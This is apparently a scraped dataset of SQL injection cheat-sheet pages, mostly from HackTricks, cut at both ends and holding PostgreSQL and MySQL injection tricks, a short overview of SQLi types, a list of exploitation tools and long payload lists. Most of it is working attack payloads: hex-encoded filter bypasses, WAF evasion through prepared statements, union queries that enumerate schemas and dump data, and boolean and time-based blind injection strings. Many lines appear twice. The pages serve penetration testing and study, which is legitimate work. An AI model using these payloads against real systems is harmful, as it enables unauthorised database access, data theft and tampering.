query_to_xml(convert_from('\\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h # Bypass via boolean + error based + query_to_xml with hex 1 or '1' = (query_to_xml(convert_from('\\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -\nIf cannot use quotes for your payload you could bypass this with CHR for basic clauses ( character concatenation only works for basic queries such as SELECT, INSERT, DELETE, etc. It does not work for all SQL statements ):\nSELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);\nSELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);\nOr with $ . This queries return the same results:\nSELECT 'hacktricks'; SELECT $$hacktricks$$; SELECT $TAG$hacktricks$TAG$;\nSELECT 'hacktricks'; SELECT $$hacktricks$$; SELECT $TAG$hacktricks$TAG$;\nLearn & practice AWS Hacking: HackTricks Training AWS Red Team Expert (ARTE) Learn & practice GCP Hacking: HackTricks Training GCP Red Team Expert (GRTE) Learn & practice Az Hacking: HackTricks Training Azure Red Team Expert (AzRTE)\nJoin the ð¬ Discord group or the telegram group or follow us on Twitter ð¦ @hacktricks_live .\nShare hacking tricks by submitting PRs to the HackTricks and HackTricks Cloud github repos.",
    "source": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection/index.html",
    "metadata": {
      "title": "HackTricks SQLi"
    }
  },
  {
    "content": "Learn & practice AWS Hacking: HackTricks Training AWS Red Team Expert (ARTE) Learn & practice GCP Hacking: HackTricks Training GCP Red Team Expert (GRTE) Learn & practice Az Hacking: HackTricks Training Azure Red Team Expert (AzRTE)\nJoin the ð¬ Discord group or the telegram group or follow us on Twitter ð¦ @hacktricks_live .\nShare hacking tricks by submitting PRs to the HackTricks and HackTricks Cloud github repos.\n-- MYSQL Comment # MYSQL Comment /* MYSQL Comment */ /*! MYSQL Special SQL */ /*!32302 10*/ Comment for MySQL version 3.23.02\n-- MYSQL Comment # MYSQL Comment /* MYSQL Comment */ /*! MYSQL Special SQL */ /*!32302 10*/ Comment for MySQL version 3.23.02\nconcat('a','b') database() version() user() system_user() @@version @@datadir rand() floor(2.9) length(1) count(1)\nconcat('a','b') database() version() user() system_user() @@version @@datadir rand() floor(2.9) length(1) count(1)\nSELECT hex(database()) SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers SELECT replace(database(),\"r\",\"R\") SELECT substr(database(),1,1)='r' SELECT substring(database(),1,1)=0x72 SELECT ascii(substring(database(),1,1))=114 SELECT database()=char(114,101,120,116,101,115,116,101,114) SELECT group_concat(<COLUMN>) FROM <TABLE> SELECT group_concat(if(strcmp(table_schema,database()),table_name,null)) SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END) strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()\nSELECT hex(database()) SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers SELECT replace(database(),\"r\",\"R\") SELECT substr(database(),1,1)='r' SELECT substring(database(),1,1)=0x72 SELECT ascii(substring(database(),1,1))=114 SELECT database()=char(114,101,120,116,101,115,116,101,114) SELECT group_concat(<COLUMN>) FROM <TABLE> SELECT group_concat(if(strcmp(table_schema,database()),table_name,null)) SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END) strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()\nSELECT * FROM some_table WHERE double_quotes = \"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/\"\nSELECT * FROM some_table WHERE double_quotes = \"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/\"\nfrom https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/\nRemember that in \"modern\" versions of MySQL you can substitute \" information_schema.tables \" for \" mysql.innodb_table_stats \" (This could be useful to bypass WAFs).\nSELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables SELECT column_name FROM information_schema.columns WHERE table_name=\"<TABLE_NAME>\"; #Get name of the columns of the table SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges\nSELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables SELECT column_name FROM information_schema.columns WHERE table_name=\"<TABLE_NAME>\"; #Get name of the columns of the table SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges\nsubstr(version(),X,1)='r' or substring(version(),X,1)=0x70 or ascii(substr(version(),X,1))=112\nascii(substr(version(),X,1))=112\nLPAD(version(),1...lenght(version()),'1')='asd'...\nLPAD(version(),1...lenght(version()),'1')='asd'...\nRPAD(version(),1...lenght(version()),'1')='asd'...\nRPAD(version(),1...lenght(version()),'1')='asd'...\nSELECT RIGHT(version(),1...lenght(version()))='asd'...\nSELECT RIGHT(version(),1...lenght(version()))='asd'...\nSELECT LEFT(version(),1...lenght(version()))='asd'...\nSELECT LEFT(version(),1...lenght(version()))='asd'...\nSELECT INSTR('foobarbar', 'fo...')=1\nSELECT INSTR('foobarbar', 'fo...')=1\norder by 1 order by 2 order by 3 ... order by XXX UniOn SeLect 1 UniOn SeLect 1,2 UniOn SeLect 1,2,3 ...\norder by 1 order by 2 order by 3 ... order by XXX UniOn SeLect 1 UniOn SeLect 1,2 UniOn SeLect 1,2,3 ...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=... UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...\nLearn here different options to abuse a Mysql injection to obtain a SSRF .\nExecuting queries through Prepared Statements\nWhen stacked queries are allowed, it might be possible to bypass WAFs by assigning to a variable the hex representation of the query you want to execute (by using SET), and then use the PREPARE and EXECUTE MySQL statements to ultimately execute the query. Something like this:\n0); SET @query = 0x53454c45435420534c454550283129; PREPARE stmt FROM @query; EXECUTE stmt; #\n0); SET @query = 0x53454c45435420534c454550283129; PREPARE stmt FROM @query; EXECUTE stmt; #\nFor more information please refer to this blog post .\nInformation_schema alternatives\nRemember that in \"modern\" versions of MySQL you can substitute information_schema.tables for mysql.innodb_table_stats or for sys.x$schema_flattened_keys or for sys.schema_table_statistics\nSelect 2 columns without using any comma ( https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma ):\n-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#\n-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#\nRetrieving values without the column name\nIf at some point you know the name of the table but you don't know the name of the columns inside the table, you can try to find how may columns are there executing something like:\n# When a True is returned, you have found the number of columns select (select \"\", \"\") = (SELECT * from demo limit 1); # 2columns select (select \"\", \"\", \"\") < (SELECT * from demo limit 1); # 3columns\n# When a True is returned, you have found the number of columns select (select \"\", \"\") = (SELECT * from demo limit 1); # 2columns select (select \"\", \"\", \"\") < (SELECT * from demo limit 1); # 3columns\nSupposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:\n# When True, you found the correct char and can start ruteforcing the next position select (select 1, 'flaf') = (SELECT * from demo limit 1);\n# When True, you found the correct char and can start ruteforcing the next position select (select 1, 'flaf') = (SELECT * from demo limit 1);\nMore info in https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952\nYou ca see other executions inside the MySQL reading the table: sys.x$statement_analysis\nmysql> select @@innodb_version; mysql> select @@version; mysql> select version();\nmysql> select @@innodb_version; mysql> select @@version; mysql> select version();\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md ]\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md\nLearn & practice AWS Hacking: HackTricks Training AWS Red Team Expert (ARTE) Learn & practice GCP Hacking: HackTricks Training GCP Red Team Expert (GRTE) Learn & practice Az Hacking: HackTricks Training Azure Red Team Expert (AzRTE)\nJoin the ð¬ Discord group or the telegram group or follow us on Twitter ð¦ @hacktricks_live .\nShare hacking tricks by submitting PRs to the HackTricks and HackTricks Cloud github repos.",
    "source": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/mysql-injection/index.html",
    "metadata": {
      "title": "HackTricks SQLi"
    }
  },
  {
    "content": "In this section, we'll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.\nSQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.\nIn some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.\n| SQL Injection Type | Description |----------------|-------------------------------| |In-band SQLi (Classic SQLi)|In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi. | |Error-based SQLi |Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.| |Union-based SQLi |Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.| |Inferential SQLi (Blind SQLi)|Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.| |Boolean-based (content-based) Blind SQLi |Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.| |Time-based Blind SQLi |Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.| |Out-of-band SQLi|Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).| | Voice Based Sql Injection | It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. |\nSQLMap – Automatic SQL Injection And Database Takeover Tool\nSQLMap – Automatic SQL Injection And Database Takeover Tool\njSQL Injection – Java Tool For Automatic SQL Database Injection\njSQL Injection – Java Tool For Automatic SQL Database Injection\nBBQSQL – A Blind SQL-Injection Exploitation Tool\nBBQSQL – A Blind SQL-Injection Exploitation Tool\nNoSQLMap – Automated NoSQL Database Pwnage\nNoSQLMap – Automated NoSQL Database Pwnage\nWhitewidow – SQL Vulnerability Scanner\nWhitewidow – SQL Vulnerability Scanner\nexplo – Human And Machine Readable Web Vulnerability Testing Format\nexplo – Human And Machine Readable Web Vulnerability Testing Format\nBlind-Sql-Bitshifting – Blind SQL-Injection via Bitshifting\nBlind-Sql-Bitshifting – Blind SQL-Injection via Bitshifting\nLeviathan – Wide Range Mass Audit Toolkit\nLeviathan – Wide Range Mass Audit Toolkit\nBlisqy – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)\nBlisqy – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)\n` ' '' ` , \" \"\" / // \\ \\ ; ' or \" -- or # ' OR '1 ' OR 1 -- - \" OR \"\" = \" \" OR 1 = 1 -- - ' OR '' = ' '=' 'LIKE' '=0--+ OR 1=1 ' OR 'x'='x ' AND id IS NULL; -- '''''''''''''UNION SELECT '2 %00 / … / + addition, concatenate (or space in url) || (double pipe) concatenate % wildcard attribute indicator\n@variable local variable @@variable global variable\nAND 1 AND 0 AND true AND false 1-false 1-true 1*56 -2\n1' ORDER BY 1--+ 1' ORDER BY 2--+ 1' ORDER BY 3--+\n1' ORDER BY 1,2--+ 1' ORDER BY 1,2,3--+\n1' GROUP BY 1,2,--+ 1' GROUP BY 1,2,3--+ ' GROUP BY columnnames having 1=1 --\n-1' UNION SELECT 1,2,3--+ ' UNION SELECT sum(columnname ) from tablename --\n-1 UNION SELECT 1 INTO @,@ -1 UNION SELECT 1 INTO @,@,@\n1 AND (SELECT * FROM Users) = 1\n' AND MID(VERSION(),1,1) = '5';\n' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --\nTime-Based: ,(select * from (select(sleep(10)))a) %2c(select%20*%20from%20(select(sleep(10)))a) ';WAITFOR DELAY '0:0:30'--\n/* C-style comment -- - SQL comment ;%00 Nullbyte ` Backtick ```\nOR 1=1 OR 1=0 OR x=x OR x=y OR 1=1# OR 1=0# OR x=x# OR x=y# OR 1=1-- OR 1=0-- OR x=x-- OR x=y-- OR 3409=3409 AND ('pytW' LIKE 'pytW OR 3409=3409 AND ('pytW' LIKE 'pytY HAVING 1=1 HAVING 1=0 HAVING 1=1# HAVING 1=0# HAVING 1=1-- HAVING 1=0-- AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND '%'=' AND 1=0 AND '%'=' AND 1083=1083 AND (1427=1427 AND 7506=9091 AND (5913=5913 AND 1083=1083 AND ('1427=1427 AND 7506=9091 AND ('5913=5913 AND 7300=7300 AND 'pKlZ'='pKlZ AND 7300=7300 AND 'pKlZ'='pKlY AND 7300=7300 AND ('pKlZ'='pKlZ AND 7300=7300 AND ('pKlZ'='pKlY AS INJECTX WHERE 1=1 AND 1=1 AS INJECTX WHERE 1=1 AND 1=0 AS INJECTX WHERE 1=1 AND 1=1# AS INJECTX WHERE 1=1 AND 1=0# AS INJECTX WHERE 1=1 AND 1=1-- AS INJECTX WHERE 1=1 AND 1=0-- WHERE 1=1 AND 1=1 WHERE 1=1 AND 1=0 WHERE 1=1 AND 1=1# WHERE 1=1 AND 1=0# WHERE 1=1 AND 1=1-- WHERE 1=1 AND 1=0-- ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- ORDER BY 4-- ORDER BY 5-- ORDER BY 6-- ORDER BY 7-- ORDER BY 8-- ORDER BY 9-- ORDER BY 10-- ORDER BY 11-- ORDER BY 12-- ORDER BY 13-- ORDER BY 14-- ORDER BY 15-- ORDER BY 16-- ORDER BY 17-- ORDER BY 18-- ORDER BY 19-- ORDER BY 20-- ORDER BY 21-- ORDER BY 22-- ORDER BY 23-- ORDER BY 24-- ORDER BY 25-- ORDER BY 26-- ORDER BY 27-- ORDER BY 28-- ORDER BY 29-- ORDER BY 30-- ORDER BY 31337-- ORDER BY 1# ORDER BY 2# ORDER BY 3# ORDER BY 4# ORDER BY 5# ORDER BY 6# ORDER BY 7# ORDER BY 8# ORDER BY 9# ORDER BY 10# ORDER BY 11# ORDER BY 12# ORDER BY 13# ORDER BY 14# ORDER BY 15# ORDER BY 16# ORDER BY 17# ORDER BY 18# ORDER BY 19# ORDER BY 20# ORDER BY 21# ORDER BY 22# ORDER BY 23# ORDER BY 24# ORDER BY 25# ORDER BY 26# ORDER BY 27# ORDER BY 28# ORDER BY 29# ORDER BY 30# ORDER BY 31337# ORDER BY 1 ORDER BY 2 ORDER BY 3 ORDER BY 4 ORDER BY 5 ORDER BY 6 ORDER BY 7 ORDER BY 8 ORDER BY 9 ORDER BY 10 ORDER BY 11 ORDER BY 12 ORDER BY 13 ORDER BY 14 ORDER BY 15 ORDER BY 16 ORDER BY 17 ORDER BY 18 ORDER BY 19 ORDER BY 20 ORDER BY 21 ORDER BY 22 ORDER BY 23 ORDER BY 24 ORDER BY 25 ORDER BY 26 ORDER BY 27 ORDER BY 28 ORDER BY 29 ORDER BY 30 ORDER BY 31337 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- %' AND 8310=8310 AND '%'=' %' AND 8310=8311 AND '%'=' and (select substring(@@version,1,1))='X' and (select substring(@@version,1,1))='M' and (select substring(@@version,2,1))='i' and (select substring(@@version,2,1))='y' and (select substring(@@version,3,1))='c' and (select substring(@@version,3,1))='S' and (select substring(@@version,3,1))='X'\nOR 1=1 OR 1=0 OR x=x OR x=y OR 1=1# OR 1=0# OR x=x# OR x=y# OR 1=1-- OR 1=0-- OR x=x-- OR x=y-- OR 3409=3409 AND ('pytW' LIKE 'pytW OR 3409=3409 AND ('pytW' LIKE 'pytY HAVING 1=1 HAVING 1=0 HAVING 1=1# HAVING 1=0# HAVING 1=1-- HAVING 1=0-- AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND '%'=' AND 1=0 AND '%'=' AND 1083=1083 AND (1427=1427 AND 7506=9091 AND (5913=5913 AND 1083=1083 AND ('1427=1427 AND 7506=9091 AND ('5913=5913 AND 7300=7300 AND 'pKlZ'='pKlZ AND 7300=7300 AND 'pKlZ'='pKlY AND 7300=7300 AND ('pKlZ'='pKlZ AND 7300=7300 AND ('pKlZ'='pKlY AS INJECTX WHERE 1=1 AND 1=1 AS INJECTX WHERE 1=1 AND 1=0 AS INJECTX WHERE 1=1 AND 1=1# AS INJECTX WHERE 1=1 AND 1=0# AS INJECTX WHERE 1=1 AND 1=1-- AS INJECTX WHERE 1=1 AND 1=0-- WHERE 1=1 AND 1=1 WHERE 1=1 AND 1=0 WHERE 1=1 AND 1=1# WHERE 1=1 AND 1=0# WHERE 1=1 AND 1=1-- WHERE 1=1 AND 1=0-- ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- ORDER BY 4-- ORDER BY 5-- ORDER BY 6-- ORDER BY 7-- ORDER BY 8-- ORDER BY 9-- ORDER BY 10-- ORDER BY 11-- ORDER BY 12-- ORDER BY 13-- ORDER BY 14-- ORDER BY 15-- ORDER BY 16-- ORDER BY 17-- ORDER BY 18-- ORDER BY 19-- ORDER BY 20-- ORDER BY 21-- ORDER BY 22-- ORDER BY 23-- ORDER BY 24-- ORDER BY 25-- ORDER BY 26-- ORDER BY 27-- ORDER BY 28-- ORDER BY 29-- ORDER BY 30-- ORDER BY 31337-- ORDER BY 1# ORDER BY 2# ORDER BY 3# ORDER BY 4# ORDER BY 5# ORDER BY 6# ORDER BY 7# ORDER BY 8# ORDER BY 9# ORDER BY 10# ORDER BY 11# ORDER BY 12# ORDER BY 13# ORDER BY 14# ORDER BY 15# ORDER BY 16# ORDER BY 17# ORDER BY 18# ORDER BY 19# ORDER BY 20# ORDER BY 21# ORDER BY 22# ORDER BY 23# ORDER BY 24# ORDER BY 25# ORDER BY 26# ORDER BY 27# ORDER BY 28# ORDER BY 29# ORDER BY 30# ORDER BY 31337# ORDER BY 1 ORDER BY 2 ORDER BY 3 ORDER BY 4 ORDER BY 5 ORDER BY 6 ORDER BY 7 ORDER BY 8 ORDER BY 9 ORDER BY 10 ORDER BY 11 ORDER BY 12 ORDER BY 13 ORDER BY 14 ORDER BY 15 ORDER BY 16 ORDER BY 17 ORDER BY 18 ORDER BY 19 ORDER BY 20 ORDER BY 21 ORDER BY 22 ORDER BY 23 ORDER BY 24 ORDER BY 25 ORDER BY 26 ORDER BY 27 ORDER BY 28 ORDER BY 29 ORDER BY 30 ORDER BY 31337 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- %' AND 8310=8310 AND '%'=' %' AND 8310=8311 AND '%'=' and (select substring(@@version,1,1))='X' and (select substring(@@version,1,1))='M' and (select substring(@@version,2,1))='i' and (select substring(@@version,2,1))='y' and (select substring(@@version,3,1))='c' and (select substring(@@version,3,1))='S' and (select substring(@@version,3,1))='X'\nsleep(5)# 1 or sleep(5)# \" or sleep(5)# ' or sleep(5)# \" or sleep(5)=\" ' or sleep(5)=' 1) or sleep(5)# \") or sleep(5)=\" ') or sleep(5)=' 1)) or sleep(5)# \")) or sleep(5)=\" ')) or sleep(5)=' ;waitfor delay '0:0:5'-- );waitfor delay '0:0:5'-- ';waitfor delay '0:0:5'-- \";waitfor delay '0:0:5'-- ');waitfor delay '0:0:5'-- \");waitfor delay '0:0:5'-- ));waitfor delay '0:0:5'-- '));waitfor delay '0:0:5'-- \"));waitfor delay '0:0:5'-- benchmark(10000000,MD5(1))# 1 or benchmark(10000000,MD5(1))# \" or benchmark(10000000,MD5(1))# ' or benchmark(10000000,MD5(1))# 1) or benchmark(10000000,MD5(1))# \") or benchmark(10000000,MD5(1))# ') or benchmark(10000000,MD5(1))# 1)) or benchmark(10000000,MD5(1))# \")) or benchmark(10000000,MD5(1))# ')) or benchmark(10000000,MD5(1))# pg_sleep(5)-- 1 or pg_sleep(5)-- \" or pg_sleep(5)-- ' or pg_sleep(5)-- 1) or pg_sleep(5)-- \") or pg_sleep(5)-- ') or pg_sleep(5)-- 1)) or pg_sleep(5)-- \")) or pg_sleep(5)-- ')) or pg_sleep(5)-- AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)# SLEEP(5)# SLEEP(5)-- SLEEP(5)=\" SLEEP(5)=' or SLEEP(5) or SLEEP(5)# or SLEEP(5)-- or SLEEP(5)=\" or SLEEP(5)=' waitfor delay '00:00:05' waitfor delay '00:00:05'-- waitfor delay '00:00:05'# benchmark(50000000,MD5(1)) benchmark(50000000,MD5(1))-- benchmark(50000000,MD5(1))# or benchmark(50000000,MD5(1)) or benchmark(50000000,MD5(1))-- or benchmark(50000000,MD5(1))# pg_SLEEP(5) pg_SLEEP(5)-- pg_SLEEP(5)# or pg_SLEEP(5) or pg_SLEEP(5)-- or pg_SLEEP(5)# '\\\" AnD SLEEP(5) AnD SLEEP(5)-- AnD SLEEP(5)# &&SLEEP(5) &&SLEEP(5)-- &&SLEEP(5)# ' AnD SLEEP(5) ANd '1 '&&SLEEP(5)&&'1 ORDER BY SLEEP(5) ORDER BY SLEEP(5)-- ORDER BY SLEEP(5)# (SELECT * FROM (SELECT(SLEEP(5)))ecMj) (SELECT * FROM (SELECT(SLEEP(5)))ecMj)# (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- +benchmark(3200,SHA1(1))+' + SLEEP(10) + ' RANDOMBLOB(500000000/2) AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) RANDOMBLOB(1000000000/2) AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) SLEEP(1)/ ' or SLEEP(1) or '\" or SLEEP(1) or \" / ```\nORDER BY SLEEP(5) ORDER BY 1,SLEEP(5) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 ORDER BY SLEEP(5)# ORDER BY 1,SLEEP(5)# ORDER BY 